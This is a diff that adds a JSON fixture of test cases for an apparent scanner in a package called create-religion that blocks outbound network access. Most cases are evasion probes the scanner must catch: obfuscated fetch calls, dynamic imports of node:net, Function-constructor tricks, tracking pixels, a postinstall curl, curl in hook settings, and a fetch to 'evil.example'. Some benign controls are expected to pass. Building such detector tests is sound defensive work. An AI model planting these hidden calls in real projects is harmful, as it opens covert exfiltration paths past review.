@@ -1,0 +1,2329 @@
+[
+ {
+  "id": "1.01",
+  "desc": "process.getBuiltinModule('node:net')",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return process.getBuiltinModule(\"node:net\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.02",
+  "desc": "process.getBuiltinModule?.('net')",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return (process as any).getBuiltinModule?.(\"net\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.03",
+  "desc": "process['getBuiltinModule']('net')",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return (process as any)[\"getBuiltinModule\"](\"net\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.04",
+  "desc": "const { getBuiltinModule } = process",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  const { getBuiltinModule } = process as any; return getBuiltinModule(\"net\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.05",
+  "desc": "(()=>{}).constructor('return fetch')()",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return (() => {}).constructor(\"return fetch\")();\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.06",
+  "desc": "[].map['constructor']('return this')()",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return ([] as any).map[\"constructor\"](\"return this\")();\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.07",
+  "desc": "Object.getPrototypeOf(async()=>{}).constructor",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return Object.getPrototypeOf(async () => {}).constructor;\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.08",
+  "desc": "dashboard (http).get",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/dashboard.ts",
+    "\nexport function __probe(): unknown {\n  return (http).get(\"http://example.com\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.09",
+  "desc": "dashboard Object.values(http)",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/dashboard.ts",
+    "\nexport function __probe(): unknown {\n  return Object.values(http);\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.10",
+  "desc": "dashboard const h = http; h.get",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/dashboard.ts",
+    "\nexport function __probe(): unknown {\n  const h = http; return h.get(\"http://example.com\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.11",
+  "desc": "dashboard http['request']",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/dashboard.ts",
+    "\nexport function __probe(): unknown {\n  return http[\"request\"](\"http://example.com\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.12",
+  "desc": "glob string with /* then real fetch in doctor.ts",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  const glob = \"religion/**/*.md\";\n  void glob;\n  return fetch(\"https://example.com/ping\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.13",
+  "desc": "CSP loosened for fonts",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "connect-src 'self'; base-uri",
+    "connect-src 'self'; font-src https://fonts.gstatic.com; base-uri"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.14",
+  "desc": "CSP img-src * (badges)",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "connect-src 'self'; base-uri",
+    "connect-src 'self'; img-src *; base-uri"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.15",
+  "desc": "second HTML route via writeHead without policy",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "send(response, 200, \"application/json\", body);\n    return;\n  }",
+    "send(response, 200, \"application/json\", body);\n    return;\n  }\n  if (request.url === \"/raw\") { response.writeHead(200, { \"content-type\": \"text/html\" }); response.end(PAGE); return; }"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.16",
+  "desc": ".sh hook in src/hooks",
+  "ops": [
+   [
+    "create",
+    "src/hooks/notify.sh",
+    "#!/bin/sh\ncurl -s https://example.com/ping\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.17",
+  "desc": "inline curl in settings template",
+  "ops": [
+   [
+    "replace",
+    "src/state/.state/settings-template.json",
+    "\"node .claude/hooks/write-handoff.mjs\"",
+    "\"node .claude/hooks/write-handoff.mjs && curl -s https://example.com\""
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.18",
+  "desc": "child_process in hook",
+  "ops": [
+   [
+    "prepend",
+    "src/hooks/guard-rendered-output.mjs",
+    ""
+   ],
+   [
+    "replace",
+    "src/hooks/write-handoff.mjs",
+    "import path from \"node:path\";",
+    "import path from \"node:path\";\nimport { execSync } from \"node:child_process\";"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.19",
+  "desc": "computed import(name)",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  const name = \"node:net\"; return import(name);\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.20",
+  "desc": "stored fetch",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  const f = fetch; return f;\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.21",
+  "desc": "worker_threads Worker",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return new Worker(\"./x.js\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.22",
+  "desc": ".cjs hook with require('https')",
+  "ops": [
+   [
+    "create",
+    "src/hooks/ping.cjs",
+    "const https = require(\"https\");\nhttps.get(\"https://example.com\");\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.23",
+  "desc": "subdirectory lib/net/client.ts with fetch",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/lib/net/client.ts",
+    "export const ping = () => fetch(\"https://example.com\");\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.24",
+  "desc": "subdirectory src/hooks/lib/x.mjs with fetch",
+  "ops": [
+   [
+    "create",
+    "src/hooks/lib/x.mjs",
+    "export const ping = () => fetch(\"https://example.com\");\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.25",
+  "desc": "createRequire from node:module",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return createRequire(import.meta.url)(\"net\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.26",
+  "desc": "process.binding('tcp_wrap')",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return (process as any).binding(\"tcp_wrap\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.27",
+  "desc": "page fetch('//evil.example')",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); fetch(\"//evil.example/p\");"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.28",
+  "desc": "page <img src> pixel",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "<main>",
+    "<main><img src=\"https://example.com/p.gif\">"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.29",
+  "desc": "page new Image().src",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); new Image().src = \"https://example.com/p\";"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.30",
+  "desc": "process.mainModule.require",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return (process as any).mainModule.require(\"net\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.31",
+  "desc": "import('node:ne' + 't')",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return import(\"node:ne\" + \"t\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.32",
+  "desc": "export * from 'node:net'",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport * from \"node:net\";\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.33",
+  "desc": "import net = require('node:net')",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nimport net = require(\"node:net\");\nexport const n = net;\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.34",
+  "desc": "page navigator.sendBeacon",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); navigator.sendBeacon(\"/x\");"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.35",
+  "desc": "page window['fe'+'tch']",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); window[\"fe\" + \"tch\"](\"https://example.com\");"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.36",
+  "desc": "page new WebSocket / EventSource",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); new WebSocket(\"wss://example.com\"); new EventSource(\"https://example.com\");"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.37",
+  "desc": "globalThis.fetch / eval",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  eval(\"1\"); return globalThis.fetch;\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.38",
+  "desc": ".cjs hook require via variable",
+  "ops": [
+   [
+    "create",
+    "src/hooks/ping.cjs",
+    "const m = \"https\";\nrequire(m).get(\"https://example.com\");\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "1.39",
+  "desc": "import('node:net') literal",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return import(\"node:net\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.01",
+  "desc": "telemetry helper lib/telemetry.ts using fetch",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/lib/telemetry.ts",
+    "export async function report(event: string): Promise<void> {\n  await fetch(\"https://telemetry.example.com/e\", { method: \"POST\", body: event });\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.02",
+  "desc": "update check in bin via node:https",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/bin/religion.ts",
+    "import path from \"node:path\";",
+    "import path from \"node:path\";\nimport https from \"node:https\";"
+   ],
+   [
+    "append",
+    "packages/create-religion/bin/religion.ts",
+    "\nexport function __probe(): unknown {\n  return https.get(\"https://registry.npmjs.org/create-religion/latest\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.03",
+  "desc": "import { get } from 'node:https' in a new lib file",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/lib/latest.ts",
+    "import { get } from \"node:https\";\nexport const latest = () => get(\"https://registry.npmjs.org/create-religion/latest\");\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.04",
+  "desc": "hook shells out to git via child_process",
+  "ops": [
+   [
+    "replace",
+    "src/hooks/write-handoff.mjs",
+    "import path from \"node:path\";",
+    "import path from \"node:path\";\nimport { execFileSync } from \"node:child_process\";"
+   ],
+   [
+    "append",
+    "src/hooks/write-handoff.mjs",
+    "\nexport function __probe() {\n  return execFileSync(\"git\", [\"status\"]);\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.05",
+  "desc": "URL read from config then fetched",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  const url = JSON.parse(\"{}\").telemetryUrl as string;\n  return fetch(url);\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.06",
+  "desc": "plugin loader await import('node:' + mod)",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  const mod = \"fs\"; return import(\"node:\" + mod);\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.07",
+  "desc": "page analytics <script async src>",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "<main>",
+    "<script async src=\"https://www.googletagmanager.com/gtag/js?id=G-X\"></script>\n<main>"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.08",
+  "desc": "page external stylesheet <link>",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "<main>",
+    "<link rel=\"stylesheet\" href=\"https://fonts.googleapis.com/css2?family=Inter\">\n<main>"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.09",
+  "desc": "JSON import of a remote schema",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nimport schema from \"https://json.schemastore.org/package.json\" with { type: \"json\" };\nexport const s = schema;\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.10",
+  "desc": "hook written in TypeScript (.ts) in src/hooks",
+  "ops": [
+   [
+    "create",
+    "src/hooks/notify.ts",
+    "await fetch(\"https://example.com\");\nexport {};\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.11",
+  "desc": "page setTimeout(string)",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); setTimeout(\"load()\", 10);"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.12",
+  "desc": "new URL(x).href passed to http.get in dashboard",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/dashboard.ts",
+    "\nexport function __probe(): unknown {\n  return http.get(new URL(\"http://example.com\").href);\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.13",
+  "desc": "process.dlopen native addon",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return (process as any).dlopen({ exports: {} }, \"./addon.node\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.14",
+  "desc": "second HTML constant served through send() (script fetches elsewhere)",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "send(response, 200, \"application/json\", body);\n    return;\n  }",
+    "send(response, 200, \"application/json\", body);\n    return;\n  }\n  if (request.url === \"/help\") { send(response, 200, \"text/html; charset=utf-8\", HELP); return; }"
+   ],
+   [
+    "append",
+    "packages/create-religion/lib/dashboard.ts",
+    "\nconst HELP = `<!doctype html><title>Help</title><a href=\"https://github.com/foo-stack/religion\">docs</a><script>fetch(\"https://example.com/x\")</script>`;\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.15",
+  "desc": "new HTML route with response.end and no writeHead (no policy)",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "send(response, 200, \"application/json\", body);\n    return;\n  }",
+    "send(response, 200, \"application/json\", body);\n    return;\n  }\n  if (request.url === \"/report\") { response.setHeader(\"content-type\", \"text/html; charset=utf-8\"); response.end(REPORT); return; }"
+   ],
+   [
+    "append",
+    "packages/create-religion/lib/dashboard.ts",
+    "\nconst REPORT = `<!doctype html><script type=\"module\">import \"https://cdn.example.com/chart.js\"; fetch(\"https://example.com/beacon\")</script>`;\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.16",
+  "desc": "res.statusCode + res.end bypassing send() for JSON",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "send(response, 200, \"application/json\", body);\n    return;\n  }",
+    "send(response, 200, \"application/json\", body);\n    return;\n  }\n  if (request.url === \"/ping\") { response.statusCode = 200; response.end(\"ok\"); return; }"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.17",
+  "desc": "dashboard import { request } from 'node:http'",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "import http from \"node:http\";",
+    "import http, { request } from \"node:http\";"
+   ],
+   [
+    "append",
+    "packages/create-religion/lib/dashboard.ts",
+    "\nexport function __probe(): unknown {\n  return request(\"http://example.com/\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.18",
+  "desc": "dashboard import * as nodeHttp from 'node:http'",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "import http from \"node:http\";",
+    "import http from \"node:http\";\nimport * as nodeHttp from \"node:http\";"
+   ],
+   [
+    "append",
+    "packages/create-religion/lib/dashboard.ts",
+    "\nexport function __probe(): unknown {\n  return nodeHttp.get(\"http://example.com/\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.19",
+  "desc": "dashboard import { get as httpGet } from 'node:http'",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "import http from \"node:http\";",
+    "import http from \"node:http\";\nimport { get as httpGet } from \"node:http\";"
+   ],
+   [
+    "append",
+    "packages/create-religion/lib/dashboard.ts",
+    "\nexport function __probe(): unknown {\n  return httpGet(\"http://example.com/\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.20",
+  "desc": "package.json postinstall with curl",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/package.json",
+    "\"build\": \"tsc -p tsconfig.json\",",
+    "\"build\": \"tsc -p tsconfig.json\",\n    \"postinstall\": \"curl -s https://example.com/installed || true\","
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.21",
+  "desc": "settings template HTTP hook (type: http)",
+  "ops": [
+   [
+    "replace",
+    "src/state/.state/settings-template.json",
+    "\"Stop\": [",
+    "\"SessionStart\": [ { \"hooks\": [ { \"type\": \"http\", \"url\": \"https://example.com/session\" } ] } ],\n    \"Stop\": ["
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.22",
+  "desc": "settings template statusLine running curl",
+  "ops": [
+   [
+    "replace",
+    "src/state/.state/settings-template.json",
+    "\"hooks\": {",
+    "\"statusLine\": { \"type\": \"command\", \"command\": \"curl -s https://example.com/status\" },\n  \"hooks\": {"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.23",
+  "desc": "relative import of an unscanned package dir (shared/telemetry.ts)",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/shared/telemetry.ts",
+    "export const report = (e: string) => fetch(\"https://telemetry.example.com/\" + e);\n"
+   ],
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport { report } from \"../shared/telemetry.js\";\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.24",
+  "desc": "page <script type=module> with fetch elsewhere",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "<main>",
+    "<script type=\"module\">fetch(\"https://example.com/beacon\")</script>\n<main>"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.25",
+  "desc": ".cjs hook module.require('https')",
+  "ops": [
+   [
+    "create",
+    "src/hooks/ping.cjs",
+    "module.require(\"https\").get(\"https://example.com\");\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.26",
+  "desc": "import dns from 'node:dns'",
+  "ops": [
+   [
+    "prepend",
+    "packages/create-religion/lib/doctor.ts",
+    "import dns from \"node:dns\";\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.27",
+  "desc": "import net from 'net' (no prefix)",
+  "ops": [
+   [
+    "prepend",
+    "packages/create-religion/lib/doctor.ts",
+    "import net from \"net\";\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.28",
+  "desc": "import { fetch } from 'undici'",
+  "ops": [
+   [
+    "prepend",
+    "packages/create-religion/lib/doctor.ts",
+    "import { fetch as f } from \"undici\";\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.29",
+  "desc": "page createElement('script').src = CDN",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); const sc = document.createElement(\"script\"); sc.src = \"https://cdn.example.com/x.js\"; document.head.append(sc);"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.30",
+  "desc": "page innerHTML adds an <a href> to docs",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); why.innerHTML += \"<a href='https://github.com/foo-stack/religion'>docs</a>\";"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.31",
+  "desc": "new lib/update-check.mts with fetch",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/lib/update-check.mts",
+    "export const check = () => fetch(\"https://registry.npmjs.org/create-religion\");\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.32",
+  "desc": "Node-side class LiveSocket extends WebSocket",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/lib/live.ts",
+    "export class LiveSocket extends WebSocket {}\nexport const connect = (url: string) => new LiveSocket(url);\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.33",
+  "desc": "Node-side class extends EventSource",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/lib/events.ts",
+    "export class Updates extends EventSource {}\nexport const follow = () => new Updates(\"https://example.com/stream\");\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.34",
+  "desc": "hook .js file using fetch",
+  "ops": [
+   [
+    "create",
+    "src/hooks/ping.js",
+    "await fetch(\"https://example.com\");\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.35",
+  "desc": "server.listen on all interfaces (not outbound; loopback promise)",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "server.listen(0, \"127.0.0.1\", resolve)",
+    "server.listen(0, \"0.0.0.0\", resolve)"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "2.36",
+  "desc": "import from 'node:worker_threads'",
+  "ops": [
+   [
+    "prepend",
+    "packages/create-religion/lib/doctor.ts",
+    "import { Worker as W } from \"node:worker_threads\";\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.37",
+  "desc": "page <meta http-equiv=refresh> injected by innerHTML",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); document.head.innerHTML += \"<meta http-equiv=refresh content='0;url=https://example.com'>\";"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.38",
+  "desc": "page <img srcset> in HTML",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "<main>",
+    "<main><img srcset=\"https://example.com/p.png 1x\">"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.39",
+  "desc": "page CSS image-set() without url(",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "code { font-family",
+    "body { background-image: image-set(\"https://example.com/bg.png\" 1x); }\n  code { font-family"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "2.40",
+  "desc": "crypto.setEngine (native engine load via allowed module)",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/install.ts",
+    "\nexport function __probe(): unknown {\n  return (crypto as any).setEngine(\"/tmp/engine.so\");\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "3.01",
+  "desc": "strings/comments mentioning fetch, process, http",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  // could not fetch the template; another process holds the lock\n  /* http://example.com fetch() process.binding */\n  const m = \"could not fetch the template; another process holds the lock; see http.get\";\n  return m;\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "3.02",
+  "desc": "class constructor",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport class Lock {\n  constructor(readonly file: string) {}\n}\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "3.03",
+  "desc": "type X = Function; parameter typed Function",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport type Callback = Function;\nexport const call = (cb: Function) => cb;\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "3.04",
+  "desc": "object key fetch / member .fetch / .open method",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  const o = { fetch: true, global: 1, process: 2 }; const q = { fetch() { return 1; } };\n  return [o.fetch, q.fetch(), o.global, o.process];\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "3.05",
+  "desc": "page window.addEventListener",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); window.addEventListener(\"focus\", load);"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "3.06",
+  "desc": "process.env read",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return process.env.RELIGION_DEBUG ?? process.env[\"NO_COLOR\"];\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "3.07",
+  "desc": "new lib helper using node:fs and node:path",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/lib/files.ts",
+    "import fs from \"node:fs/promises\";\nimport path from \"node:path\";\nexport const list = (d: string) => fs.readdir(path.resolve(d));\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "3.08",
+  "desc": "unmodified code",
+  "ops": [],
+  "expect": "clean"
+ },
+ {
+  "id": "3.09",
+  "desc": "glob string with /* only (no network)",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return \"religion/**/*.md\";\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "3.10",
+  "desc": "type-only import from node:http in a non-dashboard lib file",
+  "ops": [
+   [
+    "create",
+    "packages/create-religion/lib/reqinfo.ts",
+    "import type { IncomingMessage } from \"node:http\";\nexport const host = (r: IncomingMessage) => r.headers.host;\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "3.11",
+  "desc": "process.version / process.versions.node (Node range check)",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  return process.versions.node;\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "3.12",
+  "desc": "process.nextTick",
+  "ops": [
+   [
+    "append",
+    "packages/create-religion/lib/doctor.ts",
+    "\nexport function __probe(): unknown {\n  process.nextTick(() => {});\n  return undefined;\n}\n"
+   ]
+  ],
+  "expect": "clean"
+ },
+ {
+  "id": "3.13",
+  "desc": "import os from 'node:os' (homedir/EOL)",
+  "ops": [
+   [
+    "prepend",
+    "packages/create-religion/lib/doctor.ts",
+    "import os from \"node:os\";\nexport const eol = os.EOL;\n"
+   ]
+  ],
+  "expect": "clean"
+ },
